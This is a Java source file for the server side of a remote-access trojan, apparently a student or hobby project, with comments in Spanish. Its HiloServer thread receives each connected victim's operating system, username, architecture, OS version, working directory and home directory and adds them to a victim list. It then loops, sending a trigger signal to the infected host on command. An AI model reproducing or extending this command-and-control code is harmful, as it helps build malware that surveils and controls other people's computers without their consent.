/*
 * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license
 * Click nbfs://nbhost/SystemFileSystem/Templates/Classes/Class.java to edit this template
 */
package com.cafeconpalito.troyanoserver;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.Socket;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 *
 * @author Albano Díez de Paulino
 */
public class HiloServer extends Thread {

    private Socket cliente;
    private boolean envio;

    public HiloServer(Socket cliente) {
        this.cliente = cliente;
        envio = false;
    }

    public void setEnvio(boolean envio) {
        this.envio = envio;
    }

    @Override
    public void run() {
        DataInputStream bufferDatosEntrada = null;
        DataOutputStream bufferDatosSalida = null;
        try {

            //Inicilizo las conexiones con el server con los parametros de este
            bufferDatosEntrada = new DataInputStream(cliente.getInputStream());
            bufferDatosSalida = new DataOutputStream(cliente.getOutputStream());

            //1------
            //Leer toda la info del cliente
            Client c = new Client();

            c.setSo(bufferDatosEntrada.readUTF());
            c.setIp(cliente.getLocalAddress().getHostAddress());
            c.setUsuario(bufferDatosEntrada.readUTF());
            c.setArquitectura(bufferDatosEntrada.readUTF());
            c.setVersionso(bufferDatosEntrada.readUTF());
            c.setCurrentdir(bufferDatosEntrada.readUTF());
            c.setUserhome(bufferDatosEntrada.readUTF());

            TroyanoServer.getListaclientes().add(c);

            do {
                if (envio) {
                   
                    bufferDatosSalida.writeBoolean(true);
                    envio = false;
                }
                Thread.sleep(1000);

            } while (true);

            //TroyanoServer.getListaclientes().remove(c);
        } catch (IOException ex) {
            Logger.getLogger(HiloServer.class.getName()).log(Level.SEVERE, null, ex);

        } catch (InterruptedException ex) {
            Logger.getLogger(HiloServer.class.getName()).log(Level.SEVERE, null, ex);
        } finally {

            try {

                //Cerrando los flujos
                if (bufferDatosEntrada != null) {
                    bufferDatosEntrada.close();
                }
                if (bufferDatosSalida != null) {
                    bufferDatosSalida.close();
                }
                //Cerrando cliente
                if (cliente != null) {
                    cliente.close();
                }

            } catch (IOException ex) {
                Logger.getLogger(HiloServer.class.getName()).log(Level.SEVERE, null, ex);
            }
        }
    }

}
